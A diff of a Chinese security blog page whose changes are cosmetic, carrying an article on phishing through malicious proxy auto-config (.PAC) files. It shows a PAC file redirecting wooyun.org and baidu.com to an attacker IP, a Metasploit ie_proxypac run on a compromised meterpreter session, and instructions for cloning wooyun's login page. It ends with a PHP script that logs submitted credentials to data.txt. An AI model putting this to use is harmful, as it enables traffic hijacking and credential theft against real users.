@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,21 +109,21 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过.PAC进行网络钓鱼">
 <meta property="og:url" content="https://evi1cg.github.io/archives/phish_use_pac.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="0x00常见网络钓鱼方式 攻击者进行网络钓鱼的方式常有以下几种:  1、通过修改受害者hosts文件(C:\WINDOWS\system32\drivers\etc\hosts)来实现； 2、通过修改受害者dns来实现； 3、已经进入路由器，直接修改路由器的DNS。  罗列的并不全，之后遇到的话再补充，上述三种方式很常见。 1: 修改HOSTS文件，即攻击者修改受害者HOSTS文件为如下形式：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/3806552837.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/1563240592.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/962385878.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/2417033423.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/1267945546.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/1800061666.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/09/3731424342.png">
 <meta property="og:updated_time" content="2019-01-15T05:43:36.769Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通过.PAC进行网络钓鱼">
 <meta name="twitter:description" content="0x00常见网络钓鱼方式 攻击者进行网络钓鱼的方式常有以下几种:  1、通过修改受害者hosts文件(C:\WINDOWS\system32\drivers\etc\hosts)来实现； 2、通过修改受害者dns来实现； 3、已经进入路由器，直接修改路由器的DNS。  罗列的并不全，之后遇到的话再补充，上述三种方式很常见。 1: 修改HOSTS文件，即攻击者修改受害者HOSTS文件为如下形式：">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/09/3806552837.png">
 
 
 
@@ -486,7 +503,7 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h2 id="0x00常见网络钓鱼方式"><a href="#0x00常见网络钓鱼方式" class="headerlink" title="0x00常见网络钓鱼方式"></a>0x00常见网络钓鱼方式</h2><hr>
+        <h2 id="0x00常见网络钓鱼方式"><a href="#0x00常见网络钓鱼方式" class="headerlink" title="0x00常见网络钓鱼方式"></a>0x00常见网络钓鱼方式</h2><hr>
 <p>攻击者进行网络钓鱼的方式常有以下几种:</p>
 <ul>
 <li><strong>1、</strong>通过修改受害者hosts文件(<code>C:\WINDOWS\system32\drivers\etc\hosts</code>)来实现；</li>
@@ -501,42 +518,42 @@
 <p>这样就受害者访问<a href="http://www.wooyun.com会直接访问到x.x.x.x。在msf中可以使用[inject_host](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/inject_host.rb)脚本来实现。" target="_blank" rel="noopener">www.wooyun.com会直接访问到x.x.x.x。在msf中可以使用[inject_host](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/inject_host.rb)脚本来实现。</a></p>
 <a id="more"></a>
 <p>2：修改dns进行攻击：<br>攻击者可以使用如下命令修改受害者的dns地址(<code>管理员身份执行</code>)：</p>
-<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32>netsh<span class="built_in"> interface ip </span>show interfaces</span><br><span class="line"></span><br><span class="line">Idx  Met   MTU   状态          名称</span><br><span class="line">---  ---  -----  -----------  -------------------</span><br><span class="line">  1   50 4294967295  connected    Loopback Pseudo-Interface 1</span><br><span class="line"> 10   10   1500  connected    本地连接</span><br><span class="line"></span><br><span class="line">C:\Windows\system32>netsh<span class="built_in"> interface ip </span><span class="builtin-name">set</span><span class="built_in"> dns </span><span class="string">"本地连接"</span> static 192.168.1.100</span><br><span class="line">C:\Windows\system32>ipconfig /all | findstr 192.168.1.100</span><br><span class="line">  <span class="built_in"> DNS </span>服务器  . . . . . . . . . . . : 192.168.1.100</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;netsh<span class="built_in"> interface ip </span>show interfaces</span><br><span class="line"></span><br><span class="line">Idx  Met   MTU   状态          名称</span><br><span class="line">---  ---  -----  -----------  -------------------</span><br><span class="line">  1   50 4294967295  connected    Loopback Pseudo-Interface 1</span><br><span class="line"> 10   10   1500  connected    本地连接</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;netsh<span class="built_in"> interface ip </span><span class="builtin-name">set</span><span class="built_in"> dns </span><span class="string">"本地连接"</span> static 192.168.1.100</span><br><span class="line">C:\Windows\system32&gt;ipconfig /all | findstr 192.168.1.100</span><br><span class="line">  <span class="built_in"> DNS </span>服务器  . . . . . . . . . . . : 192.168.1.100</span><br></pre></td></tr></table></figure>
 <p>这样就修改了受害者的DNS地址，之后可以使用msf的 <a href="http://www.rapid7.com/db/modules/auxiliary/server/fakedns" target="_blank" rel="noopener">fakedns</a>来架设dns服务器来修改域名的解析地址。</p>
 <p>除了直接修改路由器的DNS地址的以上两种方式在某些环境下还是有一些缺点的，例如，一些牛逼的AV会检测到文件的修改而发出报警，除此之外，如果受害者所处内网环境中的防火墙或路由器拦截对外部的DNS请求，修改受害者DNS的攻击方式并不能生效（因为攻击者架设的DNS在外网环境下）。</p>
 <h2 id="0x01通过PAC代理"><a href="#0x01通过PAC代理" class="headerlink" title="0x01通过PAC代理"></a>0x01通过PAC代理</h2><hr>
 <p>本文主要介绍的是Metasploit中的一个模块<a href="https://github.com/rapid7/metasploit-framework/blob/2bcdb1bec317f7659d1a1d7609db45f98d4d6df2/modules/post/windows/manage/ie_proxypac.rb" target="_blank" rel="noopener">ie_proxypac</a>。通过<a href="http://baike.baidu.com/link?url=zxBitLRRy0pS4ux3SF_cWcauZIs2bhd4eETBFtYQz__4GqO0KBvVoBK5Ox-RS0HTn3Ma30AiFnz5aCbsVIOT5_" target="_blank" rel="noopener">.PAC(自动配置代理)</a>文件来完全控制IE的用户流量。只需要修改PAC文件，攻击者就能使受害者访问的某个域名指向攻击者的IP。虽然没有修改DNS但是可以达到同样的效果，且这种方式较为隐蔽。<a href="https://www.securelist.com/en/analysis/204792308/PAC_the_Problem_Auto_Config" target="_blank" rel="noopener">已经有很多人使用这种方式进行网络钓鱼</a>。</p>
-<p>下面是一个PAC文件示例：<br></p><figure class="highlight actionscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span><span class="params">(url, host)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.wooyun.org"</span>)) { </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.baidu.com"</span>)) { </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>下面是一个PAC文件示例：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span><span class="params">(url, host)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.wooyun.org"</span>)) &#123; </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.baidu.com"</span>)) &#123; </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这个文件的配置是当受害者访问<a href="http://www.wooyun.com以及www.baidu.com时，他会直接请求到攻击者ip（" target="_blank" rel="noopener">www.wooyun.com以及www.baidu.com时，他会直接请求到攻击者ip（</a> 192.168.52.129）。</p>
 <blockquote>
 <p>详细的PAC编.P写请查看<a href="http://findproxyforurl.com/pac-functions/。" target="_blank" rel="noopener">http://findproxyforurl.com/pac-functions/。</a></p>
 </blockquote>
-<p>将以上脚本保存为test.pac，在获取meterpreter会话的基础上使用ie_proxypac脚本:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter > background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf > use post/windows/manage/ie_proxypac </span><br><span class="line">msf post(ie_proxypac) > <span class="built_in">set</span> session 1</span><br><span class="line">session => 1</span><br><span class="line">msf post(ie_proxypac) > <span class="built_in">set</span> REMOTE_PAC http://192.168.52.129/test.pac</span><br><span class="line">REMOTE_PAC => http://192.168.52.129/test.pac</span><br><span class="line">msf post(ie_proxypac) > show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/ie_proxypac):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting         Required  Description</span><br><span class="line">   ----           ---------------         --------  -----------</span><br><span class="line">   AUTO_DETECT    <span class="literal">false</span>                           yes       Automatically detect settings.</span><br><span class="line">   DISABLE_PROXY  <span class="literal">false</span>                           yes       Disable the proxy server.</span><br><span class="line">   LOCAL_PAC                                      no        Local PAC file.</span><br><span class="line">   REMOTE_PAC     http://192.168.52.129/test.pac  no        Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)</span><br><span class="line">   SESSION        1                               yes       The session to run this module on.</span><br><span class="line">msf post(ie_proxypac) > exploit </span><br><span class="line"></span><br><span class="line">[*] Setting automatic configuration script from <span class="built_in">local</span> PAC file ...</span><br><span class="line">[+] Automatic configuration script configured...</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>之后打开ie，internet选项->连接->局域网设置：</p>
-<p></p><div class="progress-images" style="width:438px"><div class="progress-images--placeholder" style="padding-bottom: 98.17351598173516%;"></div><img src="/images/loading.svg" alt="proxy.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/3806552837.png" data-thumb="/images/thumb/b1bacf1ed55e73553094b30f01f042f1.png"></div><p></p>
+<p>将以上脚本保存为test.pac，在获取meterpreter会话的基础上使用ie_proxypac脚本:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf &gt; use post/windows/manage/ie_proxypac </span><br><span class="line">msf post(ie_proxypac) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(ie_proxypac) &gt; <span class="built_in">set</span> REMOTE_PAC http://192.168.52.129/test.pac</span><br><span class="line">REMOTE_PAC =&gt; http://192.168.52.129/test.pac</span><br><span class="line">msf post(ie_proxypac) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/ie_proxypac):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting         Required  Description</span><br><span class="line">   ----           ---------------         --------  -----------</span><br><span class="line">   AUTO_DETECT    <span class="literal">false</span>                           yes       Automatically detect settings.</span><br><span class="line">   DISABLE_PROXY  <span class="literal">false</span>                           yes       Disable the proxy server.</span><br><span class="line">   LOCAL_PAC                                      no        Local PAC file.</span><br><span class="line">   REMOTE_PAC     http://192.168.52.129/test.pac  no        Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)</span><br><span class="line">   SESSION        1                               yes       The session to run this module on.</span><br><span class="line">msf post(ie_proxypac) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Setting automatic configuration script from <span class="built_in">local</span> PAC file ...</span><br><span class="line">[+] Automatic configuration script configured...</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure></p>
+<p>之后打开ie，internet选项-&gt;连接-&gt;局域网设置：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/3806552837.png" alt="proxy.png"></p>
 <p>可以看到pac已经使用pac文件进行了代理。</p>
 <blockquote>
 <p>代理尽量使用<strong>远程代理</strong>，因为IE11默认禁止本地代理，如果使用本地代理，代理是无效的。<a href="http://blogs.msdn.com/b/ieinternals/archive/2013/10/11/web-proxy-configuration-and-ie11-changes.aspx" target="_blank" rel="noopener">详情</a>测试发现，如果连接了vpn，pac代理是失效的。</p>
 </blockquote>
 <p>现在再访问<a href="http://www.baidu.com,www.wooyun.org，会看到已经转移到了我们制定的ip：" target="_blank" rel="noopener">www.baidu.com,www.wooyun.org，会看到已经转移到了我们制定的ip：</a></p>
-<p></p><div class="progress-images" style="width:1059px"><div class="progress-images--placeholder" style="padding-bottom: 47.875354107648725%;"></div><img src="/images/loading.svg" alt="test.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/1563240592.png" data-thumb="/images/thumb/68489232a304eb7e4f07f141a87d0b7c.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/1563240592.png" alt="test.png"></p>
 <h2 id="0x02能做什么"><a href="#0x02能做什么" class="headerlink" title="0x02能做什么"></a>0x02能做什么</h2><hr>
-<p>这里我们修改pac文件如下：<br></p><figure class="highlight actionscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span><span class="params">(url, host)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.wooyun.org"</span>)) { </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>这里我们修改pac文件如下：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span><span class="params">(url, host)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (shExpMatch(host, <span class="string">"www.wooyun.org"</span>)) &#123; </span><br><span class="line"> <span class="keyword">return</span> <span class="string">"PROXY 192.168.52.129:80; DIRECT"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><em>这里ip要改成自己的web的ip</em>，如果受害者请求的网站host为 <em><a href="http://www.wooyun.org" target="_blank" rel="noopener">www.wooyun.org</a></em> 时，满足规则，然后跳转到我们指定的ip地址，这里我们可以来构造钓鱼。<br>打开<a href="http://www.wooyun.org/" target="_blank" rel="noopener">wooyun</a>,右键查看源代码，将所有源代码保存为index.html，放在网站根目录下，因为当受害者请求 <em><a href="http://wooyun.org" target="_blank" rel="noopener">http://wooyun.org</a></em>，其host为 <em>wooyun.org</em> 不满足代理条件，就会直接请求，所以我们把源代码中的<a href="http://www.wooyun.org，改为wooyun.org" target="_blank" rel="noopener">www.wooyun.org，改为wooyun.org</a>:</p>
-<p></p><div class="progress-images" style="width:853px"><div class="progress-images--placeholder" style="padding-bottom: 63.65767878077374%;"></div><img src="/images/loading.svg" alt="replace.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/962385878.png" data-thumb="/images/thumb/a7088b3fee21d26ad96f4a80a3240398.png"></div><p></p>
-<p>然后找到url，src，href标签，修改为<a href="http://wooyun.org/xxxx" target="_blank" rel="noopener">http://wooyun.org/xxxx</a> 的形式，比如<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/css/style.css?v=201501291909"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/></span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>修改为<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">link</span> <span class="attr">href</span>=<span class="string">"http://wooyun.org/css/style.css?v=201501291909"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/></span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/962385878.png" alt="replace.png"></p>
+<p>然后找到url，src，href标签，修改为<a href="http://wooyun.org/xxxx" target="_blank" rel="noopener">http://wooyun.org/xxxx</a> 的形式，比如<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/css/style.css?v=201501291909"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>修改为<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"http://wooyun.org/css/style.css?v=201501291909"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>改完以后，基本上就算克隆成功了：</p>
-<p></p><div class="progress-images" style="width:1279px"><div class="progress-images--placeholder" style="padding-bottom: 50.195465207193116%;"></div><img src="/images/loading.svg" alt="clone.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/2417033423.png" data-thumb="/images/thumb/13abb9f05cb069d894c740a958a0f643.png"></div><p></p>
-<p>下来要把登陆页面的的源码复制过来，打开<a href="http://www.wooyun.org/user.php?action=login，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位`登录`，修改href为" target="_blank" rel="noopener">http://www.wooyun.org/user.php?action=login，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位`登录`，修改href为</a> user.php?action=login，修改以后此标签为：<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user.php?action=login"</span>></span>登录<span class="tag">a</span>></span> | <span class="tag"><<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://wooyun.org/user.php?action=register"</span> <span class="attr">class</span>=<span class="string">"reg"</span>></span>注册<span class="tag">a</span>><br></pre></td></tr></tbody></table></figure><p></p>
-<p>打开user.php,定位<code>用户登录</code>表单，修改表单action为post.php:<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag"><<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>></span>用户登录<span class="tag">a</span>></span><span class="tag">div</span>><br><span class="line">    <span class="tag">div</span>></span><br><span class="line"><span class="tag"><<span class="name">form</span> <span class="attr">action</span>=<span class="string">"post.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>></span>  </span><br><span class="line">.....</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>在网站根目录新建post.php，添加如下代码：<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!--?php</span--> $file = <span class="string">'data.txt'</span>;file_put_contents($file, print_r($_POST, <span class="keyword">true</span>), FILE_APPEND);<span class="meta">?></span><meta http-equiv="<span" class="string">"refresh"</span> content=<span class="string">"0; url=http://wooyun.org/user.php?action=login"</span> /></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/2417033423.png" alt="clone.png"></p>
+<p>下来要把登陆页面的的源码复制过来，打开<a href="http://www.wooyun.org/user.php?action=login，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位`登录`，修改href为" target="_blank" rel="noopener">http://www.wooyun.org/user.php?action=login，右键复制源码，保存为user.php，放在网站根目录下，修改源码中的url，src，href。修改完之后，打开index.html文件，定位`登录`，修改href为</a> user.php?action=login，修改以后此标签为：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user.php?action=login"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span> | <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://wooyun.org/user.php?action=register"</span> <span class="attr">class</span>=<span class="string">"reg"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>打开user.php,定位<code>用户登录</code>表单，修改表单action为post.php:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"post.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span>  </span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
+<p>在网站根目录新建post.php，添加如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $file = <span class="string">'data.txt'</span>;file_put_contents($file, print_r($_POST, <span class="keyword">true</span>), FILE_APPEND);<span class="meta">?&gt;</span>&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0; url=http://wooyun.org/user.php?action=login"</span> /&gt;</span><br></pre></td></tr></table></figure></p>
 <p>这样钓鱼站就搭建好了。<br>当用户登录时：</p>
-<p></p><div class="progress-images" style="width:958px"><div class="progress-images--placeholder" style="padding-bottom: 61.16910229645094%;"></div><img src="/images/loading.svg" alt="/login.png)" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/1267945546.png" data-thumb="/images/thumb/e49d1b234ff85eb2ef88747ab6db2c50.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/1267945546.png" alt="/login.png)"></p>
 <p>点击登陆以后会跳转到<a href="http://wooyun.org/user.php?action=login" target="_blank" rel="noopener">http://wooyun.org/user.php?action=login</a></p>
-<p></p><div class="progress-images" style="width:1116px"><div class="progress-images--placeholder" style="padding-bottom: 49.01433691756272%;"></div><img src="/images/loading.svg" alt="1441773420790.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/1800061666.png" data-thumb="/images/thumb/43121d485d36becee9546ed2b42a77e5.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/1800061666.png" alt="1441773420790.png"></p>
 <p>查看data.txt:</p>
-<p></p><div class="progress-images" style="width:524px"><div class="progress-images--placeholder" style="padding-bottom: 49.23664122137404%;"></div><img src="/images/loading.svg" alt="1441773646544.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2015/09/3731424342.png" data-thumb="/images/thumb/c14addbff662401c588fd2d3847d4a7e.png"></div><p></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/09/3731424342.png" alt="1441773646544.png"></p>
 <blockquote>
 <p>只是简单地一个示例，具体可以通过修改pac文件来实现控制浏览器是否进行代理。</p>
 </blockquote>
@@ -896,7 +913,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -907,7 +924,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -918,7 +935,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -929,7 +946,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -981,7 +998,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
